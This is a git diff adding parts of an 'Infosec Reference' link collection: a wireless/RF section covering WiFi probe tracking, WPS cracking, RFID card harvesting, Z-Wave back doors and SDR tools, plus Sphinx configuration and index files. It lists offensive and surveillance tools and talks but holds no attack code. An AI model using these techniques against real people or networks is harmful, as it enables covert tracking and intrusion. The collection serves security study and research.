+* [Wifi Tracking: Collecting the (probe) Breadcrumbs - David Switzer](https://www.youtube.com/watch?v=HzQHWUM8cNo)
+
+  * Wifi probes have provided giggles via Karma and Wifi Pineapples for years,
+    but is there more fun to be had? Like going from sitting next to someone on
+    a bus, to knowing where they live and hang out? Why try to MITM someone’s
+    wireless device in an enterprise environment where they may notice — when
+    getting them at their favorite burger joint is much easier. In this talk we
+    will review ways of collecting and analyzing probes. We’ll use the resulting
+    data to figure out where people live, their daily habits, and discuss uses
+    (some nice, some not so nice) for this information. We’ll also dicuss how to
+    make yourself a little less easy to track using these methods. Stingrays are
+    price prohibitive, but for just tracking people’s movements.. this is cheap
+    and easy.
+
+* [Brute forcing Wi-Fi Protected Setup - Stefan Viehböck](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf)
+
+  * The original paper on WPS cracking.
+
+* [DEF CON 23 - JoshInGeneral - Meeting People Over WiFi](https://www.youtube.com/watch?v=9SIMe0yMy78)
+
+  * In this talk we will talk about some of the things that can identify you in
+    an environment and how people can track you. We will look at bluetooth
+    scanning apps that you can use every day to track people inconspicuously
+    from your phone, while walking, metroing, or as a passenger in a car
+    driving.
+
+* [If it fits - it sniffs: Adventures in WarShipping - Larry Pesce](http://www.irongeek.com/i.php?page=videos/derbycon4/t104-if-it-fits-it-sniffs-adventures-in-warshipping-larry-pesce)
+
+  * There are plenty of ways to leverage known wireless attacks against our
+    chosen victims. We've discovered a new WiFi discovery methodology that can
+    give us insight into attack paths, internal distribution methods, internal
+    policies and procedures as well as an opportunity to launch wireless attacks
+    deep inside a facility without even stepping inside; no physical penetration
+    test needed. How do we make that happen? Box it, tape it and slap an address
+    on it: WARSHIPPING. Thanks FedEx, UPS and USPS for doing the heavy lifting
+    for us. We?'ve even got a new tool to do some of the heavy lifting for
+    location lookups too!
+
+### RFID - Radio Frequency Identification
+
+#### Security of RFID Protocols A Case Study
+
+In the context of Dolev-Yao style analysis of security proto cols, we
+investigate the security claims of a pro- posed strong-security RFID
+authentication protocol. We ex hibit a flaw which has gone unnoticed in RFID
+protocol literature and present the resulting attacks on au thentication,
+untraceability, and desynchroniza- tion resistance. We analyze and discuss the
+authors proofs of security. References to other vulnerable protocols are given.
+
+* [ravenhid](https://github.com/emperorcow/ravenhid)
+
+  * Hardware and software to run a RFID reader to harvest card information. This
+    is the PCB design and Arduino code that will run a RFID reader, allowing you
+    to gather and harvest cards. Typically, a larger reader, such as those in
+    garages, will be more successful, allowing you to ready over a couple feet
+    instead of inches. The board itself is designed to be modular and support
+    multiple methods to output harvested cards once they are read:
+  * Text file on a MicroSD card
+  * Print out to LCD
+  * Bluetooth Low Energy Arduino serial connection
+  * Each of these options are supported in code, but can be ignored on the PCB.
+    The PCB itself has been designed to use a pluggable module for each of these
+    options, making it easy to ignore, install, or change out which ones you
+    find useful.
+
+* [RFIDiggity - Pentester Guide to Hacking HF/NFC and UHF RFID - Defcon23](https://www.youtube.com/watch?v=7o38hyQWw6g)
+* [NFC Frequently Asked Questions](https://www.securetechalliance.org/publications-nfc-frequently-asked-questions/)
+
+### RF RetroReflectors
+
+* [[TROOPERS15] Michael Ossmann - RF Retroflectors, Emission Security and SDR](https://www.youtube.com/watch?v=9DABAS-PCFM)
+* [The NSA Playset - RF Retroreflectors - Defcon22](https://www.youtube.com/watch?v=5gb3C80_wXI)
+* [CONGAFLOCK - NSA Playset](http://www.nsaplayset.org/congaflock)
+
+  * CONGAFLOCK is a general purpose RF retroreflector intended for
+    experimentation.
+
+* [The Thing (Listening Device) - Wikipedia](<https://en.wikipedia.org/wiki/The_Thing_(listening_device)>)
+
+### Software Defined Radio
+
+* 101
+
+  * [Introduction to SDR and the Wireless Village(Defcon)](https://www.youtube.com/watch?v=F9kKo190_oE)
+  * [Software Defined Radio for Infosec People 101](http://garrettgee.com/appearances/software-defined-radio-for-infosec-people-101/)
+
+* Educational
+
+  * [So you want to get into SDR talk](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/01-so-ya-wanna-get-into-sdr-russell-handorf)
+  * [Bringing Software Defined Radio to the Penetration Testing Community](https://www.youtube.com/watch?v=hZJDdz6kVJ4)
+
+- General
+
+* [PHYs, MACs, and SDRs - Robert Ghilduta](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/17-phys-macs-and-sdrs-robert-ghilduta)
+
+  * The talk will touch on a variety of topics and projects that have been under
+    development including YateBTS, PHYs, MACs, and GNURadio modules. The talk
+    will deal with GSM/LTE/WiFi protocol stacks.
+
+* [RTL-SDR and GNU Radio with Realtek RTL2832U [Elonics E4000/Raphael Micro R820T] software defined radio receivers.](http://superkuh.com/rtlsdr.html)
+
+* Tools
+
+* [GNU Radio](http://gnuradio.org/redmine/projects/gnuradio/wiki)
+
+  * GNU Radio is a free & open-source software development toolkit that provides
+    signal processing blocks to implement software radios. It can be used with
+    readily-available low-cost external RF hardware to create software-defined
+    radios, or without hardware in a simulation-like environment. It is widely
+    used in hobbyist, academic and commercial environments to support both
+    wireless communications research and real-world radio systems.
+
+* [Gqrx](http://gqrx.dk/)
+
+  * Gqrx is a software defined radio receiver powered by the GNU Radio SDR
+    framework and the Qt graphical toolkit.
+
+* [Documentation](http://gqrx.dk/category/doc)
+* [Practical Tips & Tricks](http://gqrx.dk/doc/practical-tricks-and-tips)
+* [GPS-SDR-SIM](https://github.com/osqzss/gps-sdr-sim)
+
+  * Software-Defined GPS Signal Simulator; GPS-SDR-SIM
+
+* [nrsc5](https://github.com/theori-io/nrsc5)
+
+  * NRSC-5 receiver for rtl-sdr
+
+* [rtlamr](https://github.com/bemasher/rtlamr)
+  * An rtl-sdr receiver for Itron ERT compatible smart meters operating in the
+    900MHz ISM band.
+* [Uni-SDR Link](https://github.com/ms-dev-1/uni-sdr-link/releases)
+
+  * The initial release of Uni-SDR Link. This applications sole purpose is to
+    allow Universal Trunker (aka Unitrunker) to control the tuning frequency of
+    individual VFO's in SDR Console v2. This is achieved by translating
+    Unitrunker Receiver Control commands into a format accepted by SDR Console.
+    Communication occurs over virtual com / serial ports.
+
+* [ShinySDR](https://github.com/kpreid/shinysdr)
+
+  * This is the software component of a software-defined radio receiver. When
+    combined with hardware devices such as the USRP, RTL-SDR, or HackRF, it can
+    be used to listen to a wide variety of radio transmissions, and can be
+    extended via plugins to support even more modes.
+
+* [Scapy-Radio](https://bitbucket.org/cybertools/scapy-radio/src)
+
+  * This tool is a modified version of scapy that aims at providing an quick and
+    efficient pentest tool with RF capabilities. A modified version of scapy
+    that can leverage GNU Radio to handle a SDR card.
+
+* [Universal Radio Hacker](https://github.com/jopohl/urh)
+
+### Writeups
+
+* [Software Defined Radio with
+  HackRF](https://greatscottgadgets.com/sdr/[WebSDR](http://websdr.org/)
+
+  * A WebSDR is a Software-Defined Radio receiver connected to the internet,
+    allowing many listeners to listen and tune it simultaneously. SDR technology
+    makes it possible that all listeners tune independently, and thus listen to
+    different signals; this is in contrast to the many classical receivers that
+    are already available via the internet.
+
+* [Hacking the Wireless World with Software Defined Radio 2.0](http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/14-hacking-the-wireless-world-with-software-defined-radio-2-0-balint-seeber)
+* [Exploit: Hacking the Wireless World with Software Defined Radio BlackHat USA 2014](https://www.youtube.com/watch?v=XWbwFfxzw6w)
+* [From baseband to bitstream and back again: What security researchers really want to do with SDR - Andy Davis - nccgroup](https://cansecwest.com/slides/2015/From_Baseband_to_bitstream_Andy_Davis.pdf)
+* [Using Software Defined radio to attack Smart home systems](https://www.sans.org/reading-room/whitepapers/threats/software-defined-radio-attack-smart-home-systems-35922)
+* [Using Software Defined Radio for IoT Analysis](https://www.irongeek.com/i.php?page=videos/bsidesnova2017/102-using-software-defined-radio-for-iot-analysis-samantha-palazzolo)
+* [Decoding the LoRa IoT Protocol with an RTL-SDR](http://www.rtl-sdr.com/decoding-the-iot-lora-protocol-with-an-rtl-sdr/)
+
+### Zigbee Wireless Networks
+
+* [KillerBee](https://github.com/riverloopsec/killerbee)
+
+  * Framework and Tools for Attacking ZigBee and IEEE 802.15.4 networks.
+
+* [KillerBee Framework](https://code.google.com/p/killerbee/)
+
+  * KillerBee is a Python based framework and tool set for exploring and
+    exploiting the security of ZigBee and IEEE 802.15.4 networks. Using
+    KillerBee tools and a compatible IEEE 802.15.4 radio interface, you can
+    eavesdrop on ZigBee networks, replay traffic, attack cryptosystems and much
+    more. Using the KillerBee framework, you can build your own tools, implement
+    ZigBee fuzzing, emulate and attack end-devices, routers and coordinators and
+    much more.
+
+* [SecBee](https://github.com/Cognosec/SecBee)
+
+  * SecBee is a ZigBee security testing tool developed by Cognosec. The goal is
+    to enable developers and security testers to test ZigBee implementations for
+    security issues.
+
+* [Frony Fronius - Exploring Zigbee signals from Solar City](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t102-frony-fronius-exploring-zigbee-signals-from-solar-city-jose-fernandez)
+
+  * Solar equipment is becoming more readily used in homes and businesses due to
+    cost savings, eco-friendly conservationism and current tax incentives.
+    Companies like SolarCity use Power Inverters/Meters from 3rd parties in
+    order to provide it's services while making the solution affordable for
+    customers. This research will focus on understanding the communication
+    between the Inverter, Internet Gateway and web portal used to view
+    electrical consumption of subscriber.
+
+* [ZigBee Exploited: The good, the bad and the ugly - Tobias Zillner](http://www.sicherheitsforschung-magdeburg.de/uploads/journal/MJS_045_Zillner_ZigBee.pdf)
+
+### Z-Wave
+
+* [Stealthy and Persistent Back Door for Z-Wave Gateways](http://www.irongeek.com/i.php?page=videos/derbycon5/stable18-stealthy-and-persistent-back-door-for-z-wave-gateways-jonathan-fuller-ben-ramsey)
+
+  * Z-Wave is a proprietary wireless protocol that is gaining market share in
+    home automation and security systems. However, very little work has been
+    done to investigate the security implications of these sub-GHz devices. In
+    this talk we review recent work on hacking Z-Wave networks, and introduce a
+    new attack that creates a persistent back door. This attack maintains a
+    stealthy, parallel, and persistent control channel with all Z-Wave devices
+    in the home. We will demonstrate the attack against a commercial Z-Wave
+    security system.
+
+* [Honey, I'm Home!! Hacking Z-Wave Home Automation Systems - video](https://www.youtube.com/watch?v=KYaEQhvodc8)
+* [Slides - PDF](https://cybergibbons.com/wp-content/uploads/2014/11/honeyimhome-131001042426-phpapp01.pdf)
diff --git a/source/_static/.gitkeep b/source/_static/.gitkeep
new file mode 100644
index 0000000..e69de29
diff --git a/source/conf.py b/source/conf.py
new file mode 100644
index 0000000..327f155
--- /dev/null
+++ b/source/conf.py
@@ -0,0 +1,216 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+# Infosec Reference documentation build configuration file, created by
+# sphinx-quickstart on Tue Nov 28 12:34:53 2017.
+#
+# This file is execfile()d with the current directory set to its
+# containing dir.
+#
+# Note that not all possible configuration values are present in this
+# autogenerated file.
+#
+# All configuration values have a default; values that are commented out
+# serve to show the default.
+
+# If extensions (or modules to document with autodoc) are in another directory,
+# add these directories to sys.path here. If the directory is relative to the
+# documentation root, use os.path.abspath to make it absolute, like shown here.
+#
+# import os
+# import sys
+# sys.path.insert(0, os.path.abspath('.'))
+
+
+# -- General configuration ------------------------------------------------
+
+# If your documentation needs a minimal Sphinx version, state it here.
+#
+# needs_sphinx = '1.0'
+
+# Add any Sphinx extension module names here, as strings. They can be
+# extensions coming with Sphinx (named 'sphinx.ext.*') or your custom
+# ones.
+extensions = ['sphinx.ext.autodoc',
+    'sphinx.ext.doctest',
+    'sphinx.ext.todo',
+    'sphinx.ext.coverage',
+    'sphinx.ext.ifconfig',
+    'sphinx.ext.viewcode',
+    'sphinx.ext.githubpages']
+
+# Add any paths that contain templates here, relative to this directory.
+templates_path = ['_templates']
+
+# The suffix(es) of source filenames.
+# You can specify multiple suffix as a list of string:
+
+source_parsers = {
+    '.md': 'recommonmark.parser.CommonMarkParser',
+}
+
+# source_suffix = ['.rst', '.md']
+source_suffix = ['.rst', '.md']
+
+# The master toctree document.
+master_doc = 'index'
+
+# General information about the project.
+project = 'Infosec Reference'
+copyright = '2017, Robert Musser'
+author = 'Robert Musser'
+
+# The version info for the project you're documenting, acts as replacement for
+# |version| and |release|, also used in various other places throughout the
+# built documents.
+#
+# The short X.Y version.
+version = '0.1'
+# The full version, including alpha/beta/rc tags.
+release = '0.1'
+
+# The language for content autogenerated by Sphinx. Refer to documentation
+# for a list of supported languages.
+#
+# This is also used if you do content translation via gettext catalogs.
+# Usually you set "language" from the command line for these cases.
+language = None
+
+# List of patterns, relative to source directory, that match files and
+# directories to ignore when looking for source files.
+# This patterns also effect to html_static_path and html_extra_path
+exclude_patterns = []
+
+# The name of the Pygments (syntax highlighting) style to use.
+pygments_style = 'sphinx'
+
+# If true, `todo` and `todoList` produce output, else they produce nothing.
+todo_include_todos = False
+
+
+# -- Options for HTML output ----------------------------------------------
+
+# The theme to use for HTML and HTML Help pages.  See the documentation for
+# a list of builtin themes.
+
+import sphinx_rtd_theme
+html_theme = 'sphinx_rtd_theme'
+html_theme_path = [sphinx_rtd_theme.get_html_theme_path()]
+
+# Settings for the Sphinx RTD Theme
+# html_theme_options = {
+#     'typekit_id': hiw1hhg,
+#     'canonical_url': '123',
+#     'analytics_id': 123,
+#     'collapse_navigation': False,
+#     'sticky_navigation': False,
+#     'navigation_depth': 4,
+#     'includehidden': True,
+#     'logo_only': False,
+#     'display_version': True,
+#     'prev_next_buttons_location': bottom
+# }
+
+# Theme options are theme-specific and customize the look and feel of a theme
+# further.  For a list of options available for each theme, see the
+# documentation.
+#
+# html_theme_options = {}
+
+# Add any paths that contain custom static files (such as style sheets) here,
+# relative to this directory. They are copied after the builtin static files,
+# so a file named "default.css" will overwrite the builtin "default.css".
+html_static_path = ['_static']
+
+# Custom sidebar templates, must be a dictionary that maps document names
+# to template names.
+#
+# This is required for the alabaster theme
+# refs: http://alabaster.readthedocs.io/en/latest/installation.html#sidebars
+html_sidebars = {
+    '**': [
+        'relations.html',  # needs 'show_related': True theme option to display
+        'searchbox.html',
+    ]
+}
+
+
+# -- Options for HTMLHelp output ------------------------------------------
+
+# Output file base name for HTML help builder.
+htmlhelp_basename = 'InfosecReferencedoc'
+
+
+# -- Options for LaTeX output ---------------------------------------------
+
+latex_elements = {
+    # The paper size ('letterpaper' or 'a4paper').
+    #
+    # 'papersize': 'letterpaper',
+
+    # The font size ('10pt', '11pt' or '12pt').
+    #
+    # 'pointsize': '10pt',
+
+    # Additional stuff for the LaTeX preamble.
+    #
+    # 'preamble': '',
+
+    # Latex figure (float) alignment
+    #
+    # 'figure_align': 'htbp',
+}
+
+# Grouping the document tree into LaTeX files. List of tuples
+# (source start file, target name, title,
+#  author, documentclass [howto, manual, or own class]).
+latex_documents = [
+    (master_doc, 'InfosecReference.tex', 'Infosec Reference Documentation',
+     'Robert Musser', 'manual'),
+]
+
+
+# -- Options for manual page output ---------------------------------------
+
+# One entry per manual page. List of tuples
+# (source start file, name, description, authors, manual section).
+man_pages = [
+    (master_doc, 'infosecreference', 'Infosec Reference Documentation',
+     [author], 1)
+]
+
+
+# -- Options for Texinfo output -------------------------------------------
+
+# Grouping the document tree into Texinfo files. List of tuples
+# (source start file, target name, title, author,
+#  dir menu entry, description, category)
+texinfo_documents = [
+    (master_doc, 'InfosecReference', 'Infosec Reference Documentation',
+     author, 'InfosecReference', 'One line description of project.',
+     'Miscellaneous'),
+]
+
+
+
+# -- Options for Epub output ----------------------------------------------
+
+# Bibliographic Dublin Core info.
+epub_title = project
+epub_author = author
+epub_publisher = author
+epub_copyright = copyright
+
+# The unique identifier of the text. This can be a ISBN number
+# or the project homepage.
+#
+# epub_identifier = ''
+
+# A unique identification for the text.
+#
+# epub_uid = ''
+
+# A list of files that should not be packed into the epub file.
+epub_exclude_files = ['search.html']
+
+
diff --git a/Draft/detect_virtual_box_c_prog.txt b/source/detect_virtual_box_c_prog.txt
old mode 100755
new mode 100644
similarity index 100%
rename from Draft/detect_virtual_box_c_prog.txt
rename to source/detect_virtual_box_c_prog.txt
diff --git a/source/index.rst b/source/index.rst
new file mode 100644
index 0000000..20dc6b0
--- /dev/null
+++ b/source/index.rst
@@ -0,0 +1,78 @@
+Welcome to Infosec Reference!
+=============================================
+
+.. toctree::
+   :maxdepth: 1
+   :caption: Sections:
+
+   Anon-Opsec-Privacy
+   Attacking-Defending-Android
+   Attacking-Defending-iOS
+   Basic-Security-Information
+   BIOS-UEFI-Attacks-Defenses
+   Building-A-Pentest-Lab
+   Car-Hacking
+   CheatSheets
+   Conferences
+   Counter-Surveillance
+   Courses-Training
+   Crypto-Currencies
+   Cryptography-Encryption
+   CTF-Wargames
+   Darknets
+   Data-Analysis-Visualization
+   Defense
+   Disclosure
+   Disinformation
+   Documentation-Reports
+   Drones
+   Embedded-Device-Hardware-Hacking
+   Exfiltration
+   Exploit-Development
+   Forensics-Incident-Response
+   Fuzzing-Bug-Hunting
+   Game-Hacking
+   Hacking-Team-Writeup
+   Home-Security
+   Honeypots
+   How-To-Suck-at-Information-Security
+   Lab-For-Exploit-Dev-Basic
+   Mainframes
+   Malware
+   Metasploit
+   Network-Attacks-Defenses
+   Network-Security-Monitoring-Logging
+   Open-Source-Intelligence
+   Opsec-rant-alpraking
+   Opsec-rant2-nachash
+   Password-Bruting-and-Hashcracking
+   Phishing
+   Physical-Security
+   Policy-Compliance
+   Port-List
+   Privilege-Escalation-Post-Exploitation.md
+   Programming-Languages-Libs-Courses-References
+   Red-Teaming
+   Reverse-Engineering-REMath-Literature
+   Reverse-Engineering
+   Rootkits
+   SCADA
+   Social-Engineering
+   System-Internals-Windows-Linux
+   things-added
+   Threat-Hunting
+   Threat-Intelligence
+   Threat-Modeling
+   Useful-Stuff
+   UX-Design
+   Web-And-Browsers
+   Wireless-Networks-And-RF
+
+
+
+Documents links
+==================
+
+* :ref:`genindex`
+* :ref:`modindex`
+* :ref:`search`
\ No newline at end of file
diff --git a/source/things-added.md b/source/things-added.md
new file mode 100644
index 0000000..776c677
--- /dev/null
+++ b/source/things-added.md
@@ -0,0 +1,113 @@
+# Things added to or be added
+
+### ATT&CK
+
+* [Script Task - SQL Server](https://docs.microsoft.com/en-us/sql/integration-services/control-flow/script-tas)k
+
+* [Cloakify](https://github.com/TryCatchHCF/Cloakify)
+
+  * CloakifyFactory & the Cloakify Toolset - Data Exfiltration & Infiltration In
+    Plain Sight; Evade DLP/MLS Devices; Social Engineering of Analysts; Defeat
+    Data Whitelisting Controls; Evade AV Detection. Text-based steganography
+    usings lists. Convert any file type (e.g. executables, Office, Zip, images)
+    into a list of everyday strings. Very simple tools, powerful concept,
+    limited only by your imagination.
+
+* [BigPhish](https://github.com/Psychotrope37/bigphish)
+  * This issue has been resolved by Apple in MacOS Sierra by enabling
+    tty_tickets by default. NOTE: All other MacOS operation system (El Capitan,
+    Yosemite, Mavericks etc...) still remain vulnerable to this exploit.
+
+## Anonymity/Privacy
+
+## Basic Security Info
+
+## BIOS/UEFI
+
+## Building a Lab
+
+## Car Hacking
+
+## Conferences
+
+## Courses
+
+## CTF
+
+## Crypto
+
+## Crypto Currencies
+
+## Data Analysis/Visualization
+
+## Design
+
+## Disclosure
+
+## Drones
+
+## Documentation/Technical writing
+
+## Embedded Devices/Hardware (Including Printers & PoS)
+
+## Exfiltration
+
+## Exploit Dev
+
+## Forensics
+
+## Fuzzing/Bug Hunting
+
+## Game Hacking
+
+## Honeypots
+
+## ICS/SCADA
+
+## Interesting Things
+
+## Lockpicking
+
+## Malware
+
+## Mainframes
+
+## Network Scanning and Attacks
+
+## Network Monitoring & Logging & Threat Hunting
+
+## OSINT
+
+## OS X
+
+## Password Cracking
+
+## Phishing
+
+## Physical Security
+
+## Policy
+
+## Post Exploitation/Privilege Escalation
+
+## Programming:
+
+## RE
+
+## Red Team/Adversary Simulation/Pentesting
+
+## Rootkits
+
+## SCADA / Heavy Machinery
+
+## Social Engineering
+
+## System Internals
+
+## Threat Modeling & Analysis
+
+## UI
+
+## Web:
+
+## Wireless Stuff
diff --git a/yarn.lock b/yarn.lock
new file mode 100644
index 0000000..f88f64a
--- /dev/null
+++ b/yarn.lock
@@ -0,0 +1,7 @@
+# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
+# yarn lockfile v1
+
+
+prettier@^1.8.2:
+  version "1.8.2"
+  resolved "https://registry.yarnpkg.com/prettier/-/prettier-1.8.2.tgz#bff83e7fd573933c607875e5ba3abbdffb96aeb8"